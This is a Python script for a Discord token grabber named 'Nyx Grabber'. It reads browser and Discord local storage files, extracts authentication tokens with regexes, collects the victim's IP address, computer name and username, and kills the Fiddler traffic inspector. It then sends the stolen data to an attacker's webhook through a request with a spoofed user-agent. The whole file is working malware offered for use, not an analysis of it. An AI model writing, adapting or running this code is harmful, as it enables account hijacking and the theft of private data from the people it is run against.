import os
import re
import json
import psutil
import random
import platform
import requests
import threading
from urllib.request import Request, urlopen

# Webhook url
WEBHOOK_URL = 'WEBHOOK HERE'

colors = [ 0xa046e0, 0x496ad6, 0x7fd649, 0xed3e5b ]

# ============================================================================================================================== #

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore') if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}', r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}'):
                for token in re.findall(regex, line):
                    tokens.append(token)

    return tokens

# ============================================================================================================================== #

def killfiddler():
    for proc in psutil.process_iter():
        if proc.name() == "Fiddler.exe":
            proc.kill()
threading.Thread(target=killfiddler).start()

# ============================================================================================================================== #

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    ip_addr = requests.get('https://api.ipify.org').content.decode('utf8')
    pc_name = platform.node()
    pc_username = os.getenv("UserName")

    checked = []

    default_paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = '@here **cybersafe token**'

    for platforrm, path in default_paths.items():
        if not os.path.exists(path):
            continue
        
        tokens = find_tokens(path)
        embedMsg = f"**cs token** \n\n"

        if len(tokens) > 0:
            for token in tokens:
                if token in checked:
                    continue
                checked.append(token)
                embedMsg += f"**📃 Token:** ```{token}```"
        else:
            embedMsg = 'No tokens found.'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    embed = {
        "title": "__Nyx Grabber__",
        "description": f"{embedMsg}",
        "color": random.choice(colors),
        "thumbnail": {
            "url": "https://media2.giphy.com/media/dbNpasmnFjbPv85DU9/giphy.gif"
        },
        "fields": [
            {
            "name": "⚒️ Platform:",
            "value": f"{platforrm}",
            "inline": True
            },
            {
            "name": "🔰 IP:",
            "value": f"{ip_addr}",
            "inline": True
            },
            {
            "name": "💻 PC-Name:",
            "value": f"{pc_name}",
            "inline": True
            },
                        {
            "name": "💻 PC-User:",
            "value": f"{pc_username}",
            "inline": True
            },
      ]
    }

    payload = json.dumps({ 'content': message, 'embeds': [embed] })

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()
